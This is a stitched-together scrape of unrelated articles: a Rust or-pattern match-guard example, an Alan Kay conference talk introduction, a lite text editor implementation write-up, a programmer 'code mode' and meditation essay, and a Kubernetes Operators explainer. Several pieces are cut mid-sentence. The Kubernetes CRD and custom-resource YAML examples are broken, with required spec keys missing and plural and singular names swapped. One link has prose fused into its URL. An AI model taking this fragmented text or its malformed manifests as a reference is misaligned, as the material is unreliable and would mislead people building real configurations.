<span>pub</span> <span>fn</span> <span>check</span><span>(</span><span>x</span><span>:</span> <span>i32</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
    <span>use</span> <span>std</span><span>::</span><span>io</span><span>::{</span><span>stdin</span><span>};</span>
    <span>println!</span><span>(</span><span>"Checking this match: {}. Should we accept it? y/n"</span><span>,</span> <span>x</span><span>);</span>
    <span>let</span> <span>mut</span> <span>s</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>
    <span>stdin</span><span>()</span><span>.read_line</span><span>(</span><span>&amp;</span><span>mut</span> <span>s</span><span>)</span><span>.expect</span><span>(</span><span>"Did not enter a correct string"</span><span>);</span>
    <span>return</span> <span>s</span><span>.trim</span><span>()</span> <span>==</span> <span>"y"</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>match</span> <span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>{</span>
        <span>(</span><span>x</span><span>,</span> <span>_</span><span>)</span> <span>|</span> <span>(</span><span>_</span><span>,</span> <span>x</span><span>)</span> <span>if</span> <span>check</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":)"</span><span>)</span>
        <span>}</span>
        <span>_</span> <span>=&gt;</span> <span>{</span>
            <span>println!</span><span>(</span><span>":("</span><span>)</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In particular, the guard can now run multiple times:</p>

<div><div><pre><code>$ cargo +nightly run
Checking this match: 1. Should we accept it? y/n
n
Checking this match: 2. Should we accept it? y/n
y
:)
</code></pre></div></div>

<p>I’m not sure what the right decision is for Python. Or-patterns and guards may just not compose well.</p>

<div>
<p>This summer we were due to hold our XT20 conference, which was going to focus on
how we could bring some of the approaches of the past to tackle the challenges
of the present and the future. Unfortunately, one of these future challenges
arrived, and we had to make the difficult decision to cancel the event.</p>
<p>Alan Kay was one of the leading researchers at the legendary labs of ARPA and
Xerox PARC in the 1960s and 1970s. We wanted to understand from Alan how Xerox
PARC came to be, and how could possibly reproduce what happened there, to make
similar leaps for our industry in the future.</p>
<p>When we held our XT16 conference, we made short videos with all of our speakers
to introduce their talks, and we wanted to continue this tradition with XT20. So
prior to the cancellation, we recorded a short piece with Alan to introduce the
content of his talk.</p>
<p>Alan stresses that we’re only just at the start of our industry and
that we’ve a long way to go. As he puts it, many of great ideas from
the 1960s and 1970s are still landing, before we consider the new
ground-breaking ideas that are yet to be found. To find those ideas,
we need to seek out the brightest among us, and then we have to figure
out how to fund and manage them properly.</p>
<div>
<p>

</p>
</div>
<div>
<blockquote>
<p>I got asked to give a talk at XT20 because I was one of the researchers and a
leader of a research group in the ARPA and Xerox combined research community in
the sixties and the seventies that invented many of the technologies that are in
use today including the ones that we’re using right now, these include: Personal
Computing; The Graphic User Interface; Ethernet; The Internet; Laser Printing;
Client/Server computing, and a host of other ones.</p>
<p>And so this was not just a series of inventions but was actually the creation of
several really large industries that have, according to the Wall St. Journal,
have returned about 45 trillion (US dollars) to the world, and the four largest
capital net-worth companies in America all used, are based on, these
technologies, so besides being good ideas, besides being something that can
boost human intellect and can deal with much more complicated situations, it
also has been a tremendous commercial success far beyond normal R&amp;D efforts.</p>
<p>One point of interest, I think, to people is that despite this, <strong>no country or
company or Univerisity is willing to fund such an effort!</strong>. The key is: can you
get the right people, and can you set up something that allows the researchers
and the right researchers to do the kind of stuff that normally was only done
when countries felt that they were in the middle of a war.</p>
<p>That’s the second point, there have been many such efforts, successful efforts,
such as ARPA and Xerox PARC in the past, especially in the US, and the Cold War,
and then back in WWII, and the particular way of going about it actually traces
back to the combined joint work of the UK and the US in developing Radar for
WWII. There’s a direct link in the methodologies used back then, and to an
extent in projects that are not so directly involved such as Bletchley Park (in
the UK) and Los Alamos and the Atomic Bomb effort (in the US).</p>
<p>So I think what will be of interest to the people who go to this conference will
likely be the idea first that it really can be done, and <em>has</em> been done (more
than once).</p>
<p>Most normal regular people are quite against taking what seems to be a huge risk
but in fact, the pay-off from these risks, which is actually only been a few
hundred million (GB) pounds or so, has been in the trillions!</p>
<p>So if you count up all the zeros the return on investment is not 15% but more like 20,000%,
so it actually would make good business sense for people to take these kinds of
risks, but that isn’t the way business people think. And so this is, I think, a
really interesting area to explore and that’s what I will at least open the
door to in my talk.</p>

<p>2020.06.04</p>
<p>updated: 2020.06.06</p>



<p>
  This write-up outlines some of the implementation details of the
  <a href="http://github.com/rxi/lite">lite</a> text editor. At the time of writing
  this lite is version <a href="https://github.com/rxi/lite/releases/tag/v1.06">1.06</a>.
</p>


<p>
  Lite is written mainly in Lua (5.2) with the lowest level parts written in C.
  It is written with the intent of being lightweight, easy on the eyes,
  responsive and trivial to modify and extend. To achieve this the core
  implementation aims to be <em>as simple as possible</em>: complexity is only
  brought in when it's proven the simplest method isn't practical.
</p>



<p>
  The core of lite implements documents, syntax highlighting, a
  cooperative-threading system, basic logging and the general ui layout system.
  Overall the core is in charge of handling user input, running per-frame tasks,
  and rendering the resultant frame early enough to meet the frames-per-second
  specified in <code>config.fps</code>.
</p>



<p>
  Lite implements a cooperative-threading system where by background tasks —
  such as full-document syntax highlighting and updating the internal list of
  project files — can be performed incrementally. Cooperative threads in lite are
  implemented using lua's coroutines and are referred internally as simply
  <code>threads</code>.
</p>
<p>
  A thread can be started by using the <code>core.add_thread()</code> function, this
  function takes a function, and an optional object which is used as a weak
  reference to that thread, eg. if a doc is passed as the weak reference, when
  that doc is garbage collected the coinciding thread will also cease to exist.
</p>
<p>
  As threads in lite are cooperative they're expected to regularly call
  <code>couroutine.yield()</code>. Typically this yielding is done every <code>n</code>
  lines for line-based tasks (eg. full-project search, syntax highlighting).
  When a thread yields the core will continue to render the frame, or — if there is
  still enough time left in the current frame — pass control to another thread.
  Threads can also pass a numerical argument to <code>coroutine.yield()</code> to wait
  for the number of seconds specified:
</p>
<pre>core.add_thread(function()
  -- print "hello world" every 10 seconds
  while true do
    print("hello world")
    coroutine.yield(10)
  end
end
</pre>
<p>
  Practical usage examples of lite's threading can be seen in the core's project
  file scanning (<code>data/core/init.lua</code>) and the incremental syntax highlighting
  (<code>data/core/doc/highlighter.lua</code>).
</p>


<p>
  All loaded text files in lite are stored in <code>Docs</code>. A doc keeps a table
  of a text file's lines (<code>Doc.lines</code>), undo and redo
  state, the current syntax (<code>Doc.syntax</code>), syntax highlighting state
  (<code>Doc.highlighter</code>) and caret/selection state. Docs are opened using the
  <code>core.open_doc()</code> function; if the function is called and a doc of that
  filename is already open then the existing doc is returned such that
  more-than-one doc representing the same file should never be present.
</p>
<p>
  Lite stores all the open docs in the <code>core.docs</code> table; each frame lite
  checks the number of views referencing each doc and releases those with zero
  references — this is an instance of lite favoring polling over callbacks or
  event listeners. This approach is done throughout lite; in avoiding event
  listeners we also avoid having to manage unregistering event handlers or worry
  about having those which are never unregistered through error. This leads to
  much simpler, less error-prone code.
</p>

<p>
  Lite implements a simple syntax highlighter based around lua patterns, this is
  split up into 3 parts:
</p>
<ul>
  <li><code>core.syntax</code>: stores language syntax specifications</li>
  <li><code>core.tokenizer</code>: converts text into table of tokens using a given syntax</li>
  <li><code>core.doc.highlighter</code>: stores token state for lines of a doc and handles
         full-document incremental highlighting</li>
</ul>
<p>
  A language syntax is stored as a table of lua patterns mapped to to their
  resultant token type (<code>.patterns</code>) and a table of symbols mapped to their
  token type (<code>.symbols</code>). Patterns in the pattern table can also be a
  range of the following format:
</p>
<pre>{ range_start_pattern, range_end_pattern [, escape_character] }
</pre>
<p>
  Ranges can be used for matching strings:
</p>
<pre>{ '"', '"', '\\' }
</pre>
<p>
  An example of syntax specifications can be seen in any of the
  <code>data/plugins/language_*.lua</code> files.
</p>
<p>
  The highlighter persists range state between lines by storing the pattern
  table index of the current range. As the highlighter works in increments of
  lines, ranges are useful for multi-line comments or strings which a single
  pattern would fail on.
</p>
<p>
  When the <code>tokenizer.tokenize()</code> function is called it iterates the syntax's
  pattern table from top to bottom, such that patterns higher up in the table
  take precedence. When it matches a pattern it pushes the token to the
  resultant table, if the token's content matches any of the keys in the
  <code>.symbols</code> table that value is used instead of the matched token value;
  this acts both as a more convenient way of specifying keywords as well as an
  optimization as the tokenizer can attempt matching fewer patterns, even if
  there are many keywords specified. The function returns a <code>state</code> integer
  which is used to indicate which pattern range it is currently inside if it is
  inside any.
</p>
<p>
  <code>core.doc.highlighter</code> is in charge of providing tokenized lines when
  displaying a document; each doc stores a <code>Highlighter</code> object. The
  highlighter assures highlighting information for any line that is requested
  is <em>always</em> available, even if the full-document incremental highlighter
  has not yet reached that line.
</p>
<p>
  When a request is made to the highlighter for a specific line the highlighter
  first checks its cache for the line; if it does not have the line cached —
  or, if the line's text has changed since its cached version — it immediately
  tokenizes the line, continuing from the tokenizer state left from the
  previous line. The highlighter's <code>max_wanted_line</code> field is set to
  that line's value if it's greater than the existing <code>max_wanted_line</code>.
</p>
<p>
  A doc's highlighter creates a thread when it's created which it uses to do
  full-document highlighting starting from its <code>first_invalid_line</code> up
  until the <code>max_wanted_line</code>. When a change occurs in a document the
  <code>first_invalid_line</code> is set to the first line of the change if it's
  greater than the current <code>first_invalid_line</code>.
</p>
<p>
  This implementation results in the following characteristics:
</p>
<ul>
  <li>Displayed lines are always syntax highlighted with, at the very
         least, highlighting which is valid to the current screen's content</li>
  <li>Displayed lines are <em>eventually</em> highlighted with
         full-document aware highlighting</li>
  <li>The highlighting is performed per-line, and so — with the exception
         of extremely long lines — can be done incrementally without a
         negative effect on responsiveness</li>
  <li>Highlighting is only performed up until the point in the document it
         is required, for example, up until the last visible line</li>
</ul>



<p>
  Each part of lite's UI is implemented as a <code>View</code>, that is, a document is
  shown in the UI as a <code>DocView</code>, the status bar at the bottom the
  <code>StatusView</code> etc. Each view exists within the <code>RootView</code>
  (<code>core.root_view</code>) which is in charge of calling the <code>:update()</code> and
  <code>:draw()</code> functions of each view, managing the layout of the
  views, and routing user input to relevant views.
</p>
<p>
  The rootview is implemented as a binary tree of <code>Nodes</code>. Each node is one
  of the following types:
</p>
<ul>
  <li><code>hsplit</code>: Contains two children side-by-side and a divider between them</li>
  <li><code>vsplit</code>: Contains two children one-above-the-other and a divider between them</li>
  <li><code>leaf</code>: Contains one or more views, and, if there is more than one
        view, a tab at the top for each view.</li>
</ul>
<p>
  Each frame the rootview calculates its layout based on the divider position of
  each split and sets the <code>.size</code> field of each node and view accordingly.
</p>
<p>
  The rootview also has a concept of <em>locked nodes</em>; the size of a locked
  node is not determined by the divider position but instead is set from the
  view's <code>.size</code> field. Locked nodes cannot be resized by the user as
  normal nodes would be, they cannot be closed and cannot open additional views.
  The locked-node feature is used for, amongst other things, the status bar at the
  bottom of the screen which we typically want to be always present and
  immutable.
</p>
<p>
  lite takes the approach of effectively redrawing <em>everything</em> whenever
  it needs to redraw <em>anything</em>, this lends itself to simplified UI code.
  There are no event listeners or callbacks to manage. If something changes the
  state of the UI (eg. the caret is moved), the <code>core.redraw</code> boolean is set
  to <code>true</code> to signify that something has changed and the UI is redrawn on
  that frame. For further simplicity any user input events will also set
  <code>core.redraw</code>, such that there's a guarantee any change which resulted from
  user input will result in the screen contents being updated.
</p>
<p>
  Although the idea of redrawing everything each time may appear wasteful, lite
  employs a technique where by only regions of the screen which have changed
  between frames are actually redrawn — these regions can be displayed by calling
  <code>renderer.show_debug(true)</code>. This technique is implemented on the C level
  of the code and is invisible to the lua portion which acts as if it's doing
  a full redraw each time.
</p>
<p>
  An overview of how this is achieved is detailed in the
  <a href="https://rxi.github.io/cached_software_rendering.html">Cached Software Rendering</a> write-up.
</p>



<p>
  Lite's plugin system is based around lua's module system; each plugin is
  simply a lua module (that is, a single <code>.lua</code> file, or, a directory
  containing a <code>init.lua</code> file). All modules in the <code>data/plugins</code>
  directory are automatically loaded when lite starts — this is done after
  initializing the core and before loading the user and project modules. Thus to
  install a plugin you simply place the file in the plugins directory; to
  uninstall a plugin you delete the file.
</p>
<p>
  A specific order of which plugins are loaded is not guaranteed by lite but,
  as plugins are just regular lua modules, a plugin can simply call <code>require</code>
  on another plugin if it needs to assure that …</p></div>

For instance the fire emoji, <code>🔥</code>, is actually 4 bytes because of how UTF-8 works. This means that only 8 fire emojis could be used.

    <h2>Code Mode</h2>

<p>It's been a wild week. You and your team have been engaged in an all-out war with the codebase for the past two spints. There's this new integration with a partner that's close to being shipped, and it promises bountiful revenue and voluminous web traffic. And you've been working on the part of it that'll seal the deal and let your squad deploy, come Monday morning.</p>

<p>You find yourself on the Friday night before launch, 6pm, absolutely fried at your desk. Everyone else on your team already left to attend the company happy hour, or has gone home seeking sanity from work. For the past several hours, you've been tracking down a nasty, horrendous bug that could prevent the feature from shipping next week.</p>

<p>But you introduced it.</p>

<p>Caught late in the game, with the marketing team eager to deploy, there were no other options. Thankfully, you're close to patching things up. Your thoughts have been a web of abstractions all night, looking something like this:</p>

<ul>
<li>I've looked at <code>SuperClass</code>, but the stack trace is from <code>ChildClass</code>.</li>
<li>Alright, so <code>ChildClass</code> imports the function from <code>HelperModule</code>...</li>
<li><code>HelperModule</code> uses a bunch of functions from <code>CrazyLibrary</code>. Let's do a search. Great, <code>CrazyLibrary</code> has no documentation.</li>
<li>Wait, did I check out the latest <code>master</code> yet?</li>
<li>Oh wait, the error wasn't actually on the server. Let's look at the client.</li>
<li><code>HugeReactComponent</code> is making the call. Maybe the <code>type</code> is wrong?</li>
<li>Oh man, it uses <code>DatabaseModernClientApi</code>... I don't know <code>DatabaseModernClientApi</code>.</li>
<li>Wait no, it's in <code>MiddlewareClientServer</code>...</li>
</ul>

<p><img src="https://miro.medium.com/max/2560/0*UxR4_Op7AExQz-Oo.png"></p>

<p>At 7:30pm, you're sure you've nailed it. It was a silly conditional that got in the way. Boom, problem solved. After merging a PR that switched the broken ternary statement around, off to the happy hour you go.</p>

<p>Beaming with pride from merging the bug fix, you walk in, and notice your team chatting with folks from a sister team. You recognize some members of the sister team, but not everyone. You go and try to introduce yourself.</p>

<blockquote>
<p>"Hey y'all, what's happening?!"</p>
</blockquote>

<p>Both your team and the sister team sheepishly smile at you. "Hey man", one of them says, "long day?" You look around, and suddenly notice that some people have startled looks on their faces. Then you realize they had been having a low-key conversation, and that you'd jumped into the conversation at quite the high decibel.</p>

<blockquote>
<p>"Yeah, haha", you play it off, "Oh boy, working on the <code>PartnerIntegrationProject</code> this week was awful! Whoever wrote <code>SuperClass</code> created a complete mess. Must've taken 10 hours away from my life."</p>
</blockquote>

<p>Everyone in the circle stops smiling. Eric, who wrote that class, nervously chuckles. "Yeah, I guess it could be better, huh?" Oops. Bad move. You feel the energy drain out of the conversation they were having.</p>

<p>You stay silent for the next half hour or so, and everyone keeps chatting, but it <em>feels</em> weird. You keep noticing people's expressions and body language. There's some more forced conversation before a few folks excuse themselves. Then everyone disperses.</p>

<p>And for the rest of the evening, you can't shake off the feeling that everyone's thinking something about you. That you did something wrong. You get a sense that the energy was off, and blame yourself.</p>

<p>But you're not to blame! Everything was probably fine, and no one was judging you. You were just in <strong>code mode</strong>.</p>

<h2>What Happens In Your Brain When You Program?</h2>

<p>Ask any developer, and "code mode" is a real thing. We seem to be so drawn into our innermost thoughts of <code>classes</code>, <code>modules</code>, <code>syntax</code>, and <code>systems</code>-- that we lose track of how to mentally function the rest of the time. Some call it "monkey mind" or restlessness, but we all recognize it. It's the brain on hyperdrive, going 200 miles per hour when the speed limit's about 50.</p>

<p>It's the thinking, or rather, <em>the overthinking</em>, that is almost always unnecessary. And for reasons unbeknownst, this always tends to happen when we need to deal with other people.</p>

<p><img src="https://i.imgur.com/95NZpPy.png"></p>

<p>Now, that doesn't seem problematic, right? Being stuck in code mode is harmless. So you overthink the occasional small talk session, and can't really pay attention to long films, but is it really harmful?</p>

<p>No, not really. But understanding why it happens helps us understand how to make the gear switch a little bit smoother, which is behind my upcoming pitch for meditation. If you're able to leave the programmatic thought patterns behind anytime you'd like, you have greater control over your life.</p>

<p>Of course, we want to be sure of our assumptions. After all, the argument for meditation requires a somewhat well-formed paradigm of what's happening when we read and write code. It's important to take into account exactly which thought patterns we "execute" <strong>while</strong> in code mode.</p>

<h2>What's Going On Up There?</h2>

<p>There was a push in recent years to allow programming to replace the study of a foreign language. Around that time, <a href="https://par.nsf.gov/servlets/purl/10085745%20conducted%20a%20study%20that%20observed%2017%20participants%20in%20an%20fMRI%20scanner" rel="nofollow" target="_blank">Norman Peitek, Janet Siegmund, and a team of researchers</a> while they were comprehending short source-code snippets. Their key finding was that despite the stereotype of math and logic being the major concern in programming, the brains of the participants showed greater activation of its language centers than expected.</p>

<p>Now, this may be confusing to you, as it seemingly contradicts <em>the idea of code mode</em>. After all, if the language centers are activated, shouldn't we, as social beings who communicate through the use of language, not be affected by these lingering cognitive thought patterns?</p>

<p>This could be so. But if we dig deeper into the results of the sudy, we actually find that the programmer mind is activated more traditionally than the above finding would suggest:</p>

<blockquote>
<p>In essence, we found five relevant activation clusters, all in the left hemisphere.</p>
</blockquote>

<p>The function of the left hemisphere is thought to be for control of the right side of the body, and "is the more academic and logical side of the brain". The right hemisphere is associated with creativity, visual/spatial perception, and emotional management and expression.</p>

<p>Because this <a href="https://now.northropgrumman.com/the-left-brain-right-brain-myth-is-it-true/" rel="nofollow" target="_blank">has been disputed recently</a>, I took a look at what naysayers of the "left-brain, right-brain myth" were saying. It turns out, most of the rejection of this "myth" stems from the fact that <em>people are not usually left-brain or right-brain dominant</em>. However, the fact of the matter is, the left hemisphere is <strong>still associated</strong> with logical operations and analytical functions, and the right with more "emotional" or "creative" activities.</p>

<blockquote>
<p>In fact, a 2013 University of Utah study on brain lateralization examined the brains of more than 1,000 people and found no evidence for people having a dominant side of the brain. <em>Even though each side of the brain does more work for certain functions</em>, such as language being localized on the left and attention on the right, this doesn’t vary by person. All of the study participants, whether they were engineers or musicians, used their entire brain equally, debunking the left-brain right-brain myth.</p>
</blockquote>

<p>In addition to programming being left hemisphere dominant, there's also a lot going on. The earlier study referenced found that the activated regions while coding found were:</p>

<ol>
<li>Middle frontal gyrus (division of attention, silent word reading, verbal/numeric problem solving)</li>
<li>Middle temporal gyrus (categorization)</li>
<li>Inferior parietal lobule (verbal/numeric problem solving)</li>
<li>Inferior frontal gyrus (verbal/numeric)</li>
<li>Inferior frontal gyrus (silent word reading, problem solving)</li>
</ol>

<p>If this sounds like a surprisingly high amount of brain activity merely for <em>understanding source code</em>, I would agree. And if it sounds like you'd be surprised if all this happened when trying to sleep or talking to a friend, you'd probably be right. Thus, I'd argue that one should choose to believe that quite a bit is going in mentally when we program, and mostly in the left hemisphere.</p>

<h2>But Isn't It Fun?</h2>

<p>An interesting note to add is that this kind of intensive brain activity sounds painful in a challenging way, but is actually desirable. Many call it the "flow" state. Courtland Allen and Vincent Woo <a href="https://www.indiehackers.com/podcast/041-vincent-woo-of-coderpad" rel="nofollow" target="_blank">talked about it in their interview on IndieHackers</a>:</p>

<p>Courtland says:</p>

<blockquote>
<p>That's funny because it reminds me of the first two years after I moved to San Francisco. I started a startup and I basically just coded for sixteen hours a day, every day for two years, and the problem is that if you're in flow for that long and you don't vary your activities... you don't make new memories, everything just blurs together, so I have a two year block of time in my life where there were zero memories, and I swore that I would never do that again.</p>
</blockquote>

<p>To which Vincent replies:</p>

<blockquote>
<p>That's kind of what I suspected happened to that sixty year old plus guy at Amazon, I think he just sat down to code one day and then he woke up, and he was sixty. I don't know, I think flow is both really seductive and also kind of boring in it's own way.</p>
</blockquote>

<p>A fascinating take-away of the above conversation is the conflation of two different ideas: <code>flow</code> state and <code>code mode</code>. From our good friend, <a href="https://en.wikipedia.org/wiki/Flow_(psychology)" rel="nofollow" target="_blank">Wikipedia</a>:</p>

<blockquote>
<p>In positive psychology, a flow state, also known colloquially as being in the zone, is the mental state in which a person performing an activity is fully immersed in a feeling of energized focus, full involvement, and enjoyment in the process of the activity.</p>
</blockquote>

<p>Here, I argue this point, and I want to be succint: <code>flow</code> and <code>code mode</code> appear to be two sides of the same coin. That specific coin is neurotransmitter-fueled activity, causing us to hone in one problem (or consecutive problems) for an indefinite period of time. However, we generally use the term <code>flow</code> to refer to the good parts of it, and I'm using <code>code mode</code> as the detrimental aspect.</p>

<p>I think we'd all agree that <a href="https://algodaily.com/lessons/solving-the-health-problems-of-software-engineers" rel="nofollow" target="_blank">16 hours spent on something is not good for your health</a>, mentally or physically. Especially <a href="https://www.amazon.com/gp/product/0321751043/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=algodaily03-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0321751043&amp;linkId=6fb078bf069b7f8eb648902d5923ab87" rel="nofollow" target="_blank">the art of programming</a>-- your back aches, your eyes burn, and you leave the coding session feeling unsatisfied. This is what we want to avoid, and the mental fatigue this imparts on you will carry over to other parts of life.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Have you ever wondered how effective Site Reliability Engineering (SRE) teams manage complex applications successfully? In the Kubernetes ecosystem, there is only one answer: Kubernetes Operators! In this article, we will examine both what they are and how they work.</p><div><p>The Kubernetes Operator concept was developed by engineers at CoreOS in 2016 as an advanced and native way of building and driving every application on the Kubernetes cluster, which needs domain-specific knowledge. It provides a consistent approach to handle all application operational processes automatically, without any human reaction via close cooperation with the Kubernetes API. In other words, an operator is a way of packaging, running, and managing Kubernetes applications.</p><p>The Kubernetes Operator pattern acts in accordance with one of the core Kubernetes principles: <a href="https://en.wikipedia.org/wiki/Control_theory">the control theory</a>. In robotics and automation, it is a mechanism that continuously operates dynamical systems. It relies on an ability to quickly tailor the workload demand to the available resources as accurately as possible. The objective is to develop a control model with the necessary logic to help an application or system remain stable. In Kubernetes world, that part is handled by controllers.</p><p>A controller is a special software that, in the loop, responds to changes and performs adaptation actions in the cluster. The first Kubernetes controller was a kube-controller-manager. It is regarded as an ancestor for all operators, which were built later.</p><h2 id="what-is-a-controller-loop">What Is a Controller Loop?</h2><p>To put it simply, controller loops are the base of controller actions. Imagine there is a non-terminating process (called a reconciliation loop, in Kubernetes) happening over and over again, as in the following illustration:</p><a href="#kubernetes-operators-reconciliation-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/3d59e9e2da748992dd14e5abc92073ef7cbcbee9/9f266/img/blog/kubernetes-operators-reconciliation-loop_hu9f7037ecd3cc7a82b7d5e74d6b2b9715_20290_564x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-reconciliation-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/4d00a0df53a752d79d89dbdf5f9da2b36f5167b3/b8cdc/img/blog/kubernetes-operators-reconciliation-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>This process observes at least one Kubernetes <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/#kubernetes-objects">object</a>, which contains information about the desired state. Objects such as …</p><ul><li>Deployments,</li><li>Services,</li><li>Secrets,</li><li>Ingress,</li><li>Config Maps,</li></ul><p>… are defined by configuration files made up of manifests in JSON or YAML. Then the controller(s) makes a continuous adjustment via Kubernetes API to imitate the desired state until the current state becomes the desired state, according to the built-in logic.</p><p>In that way, Kubernetes deals with the dynamic nature of Cloud Native systems, by handling a constant change. Examples of modifications perform to achieve expected state include:</p><ul><li>Noticing when nodes go down and demanding a new one.</li><li>Checking if pods need to be replicated.</li><li>Creating a new load-balancer, if requested.</li></ul><h2 id="how-does-a-kubernetes-operator-work">How Does a Kubernetes Operator Work?</h2><p>An operator is an application-specific controller. It extends a Kubernetes API to create, configure, and manage complex applications on behalf of humans (operation engineers or site reliability engineers). Let’s see what Kubernetes documentation says about it.</p><blockquote><p><em>Operators are software extensions to Kubernetes that make use of custom resources to manage applications and their components. Operators follow Kubernetes principles, notably the control loop.</em> - <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/operator/">Kubernetes Documentation</a></p></blockquote><p>So far, you know that operators take advantage of controllers that observe Kubernetes objects. These controllers are a bit different because they are tracing custom objects, often called custom resources (CR). CR is an extension of the Kubernetes API that provides a place where you can store and retrieve structured data—the desired state of your application. The whole principle of operation is presented in the diagram below.</p><a href="#kubernetes-operators-controller-loop.png" onclick="LazyLoadImg()"><figure><img src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" data-src="https://d33wubrfki0l68.cloudfront.net/421570f988ea30fb53902d4533e0b8de6911d7b7/fa9db/img/blog/kubernetes-operators-controller-loop_hu9fe4ce2832296e1fe8a815e4eca60fda_43276_784x0_resize_box_2.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><a href="#_" id="kubernetes-operators-controller-loop.png"><figure><img src="" data-src="https://d33wubrfki0l68.cloudfront.net/63c39aec0db28d70ff470c5aec042c5301b8bc3e/93486/img/blog/kubernetes-operators-controller-loop.png" alt="Kubernetes Operator Controller Loop" title="Kubernetes Operator Controller Loop"></figure></a><p>The Operator continuously tracks cluster events relating to a specific type of custom resource. The types of events on these custom resources that can be tracked are:</p><ul><li>Add,</li><li>Update,</li><li>Delete.</li></ul><p>When the operator receives any information, it will take action to adjust the Kubernetes cluster or external system to the desired state as part of its reconciliation loop in the custom controller.</p><h2 id="how-to-add-a-custom-resource">How to add a custom resource?</h2><p>A custom resource extends Kubernetes capabilities by adding new kinds of objects that can be helpful for your application. Kubernetes provides two ways to add custom resources to clusters:</p><ul><li><strong>via API Aggregation</strong>, an advanced method that requires you to build your own API Server, but will give you more control</li><li><strong>via Custom Resource Definitions (CRD)</strong>, a simple way that can be created without any programming knowledge, as an extension to the original Kubernetes API server.</li></ul><p>These two options meet the needs of different users, who can choose between flexibility and ease of use. The Kubernetes community created a <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#choosing-a-method-for-adding-custom-resources">comparison</a> that will help you decide what method is right for you, but the most popular choice is CRD.</p><h3 id="custom-resource-definitions">Custom Resource Definitions</h3><p>Custom Resource Definitions have been around for quite some time now; the first major API specification was released with Kubernetes 1.16.0. The manifest below presents an example:</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: apiextensions.k8s.io/v1beta1
<span>kind</span>: CustomResourceDefinition
<span>metadata</span>:
  <span>name</span>: application.stable.example.com

    <span>plural</span>: application
    <span>singular</span>: applications
    <span>kind</span>: Application
    <span>shortNames</span>:
      - app
</code></pre></div><p>This CRD will allow you to create a CR called <em>Application</em>. (We are going to use it in the next section.) The first two lines define what <code>apiVersion apiextensions.k8s.io/v1beta1</code> of object kind <code>CustomResourceDefinition</code> you want to create.</p><p>The metadata describes the name of the resource, but the most important place here is the field <em>spec</em>. It lets you specify the group and version and the scope of visibility - namespaced or cluster-wide.</p><p>Afterwards, you define names in multiple formats and create a handy short name, which lets you perform a command <code>kubectl get app</code> to get the existing CR.</p><h3 id="custom-resource">Custom Resource</h3><p>The CRD above allows you to create the following manifest of a custom resource.</p><div><pre><code data-lang="yaml"><span>apiVersion</span>: stable.example.com/v1
<span>kind</span>: Application
<span>metadata</span>:
  <span>name</span>: application-config

  <span>domain</span>: teamx.yoursaas.io
  <span>plan</span>: premium
</code></pre></div><p>As you can see, we can contain here all the necessary information required to run an application for a specific case. This custom resource will be observed by our operator - to be precise, by the operator’s custom controller. According to the built-in logic in the controller, the necessary actions will imitate the desired state. It can create a Deployment, Service, and necessary ConfigMaps for our application. Run it and expose it via ingress on a specific domain. This is just an example of a use case, but it can do whatever is designed.</p><p>Operators can also be used to provision resources that live outside Kubernetes. You can control the provisioning of external routers or create a database in the cloud without leaving the Kubernetes platform.</p><h2 id="kubernetes-operators-a-case-study">Kubernetes Operators: a Case Study</h2><p>To have a whole clear picture of Kubernetes Operators, let’s examine a <a href="https://github.com/coreos/prometheus-operator">Prometheus Operator</a>, one of the first and most popular operators. It simplifies the deployment and configuration of Prometheus, Alertmanager, and related monitoring components.</p><p>The core feature of the Prometheus Operator is to monitor the Kubernetes API server for changes to specific objects and ensure that the current Prometheus deployments match these objects. The Operator acts on the following Custom Resource Definitions (CRDs):</p><ul><li><strong>Prometheus</strong>, which defines a desired Prometheus deployment.</li><li><strong>Alertmanager</strong>, which defines a desired Alertmanager deployment.</li><li><strong>ServiceMonitor</strong>, which declaratively specifies how groups of Kubernetes services should be monitored. The Operator automatically generates Prometheus scrape configuration based on the current state of the objects in the API server.</li><li><strong>PodMonitor</strong>, which declaratively specifies how a group of pods should be monitored. The Operator automatically generates Prometheus scrape configuration based on the current state of the objects in the API server.</li><li><strong>PrometheusRule</strong>, which defines a desired set of Prometheus alerting and/or recording rules. The Operator generates a rule file, which can be used by Prometheus instances.</li></ul><p>The Prometheus Operator automatically detects changes in the Kubernetes API server to any of the above objects, and ensures that matching deployments and configurations are kept in sync.</p><h2 id="need-more">Need more?</h2><p>If you would like to hear more about how to extend Kubernetes, take a look at this talk from one of my Container Solutions colleagues, Adam Otto, from <a href="https://cloudnativewarsaw.com/">Cloud Native Warsaw Conference</a>.</p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/8QoCL1NCVv4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><hr><p>The article has been originally published on the <a 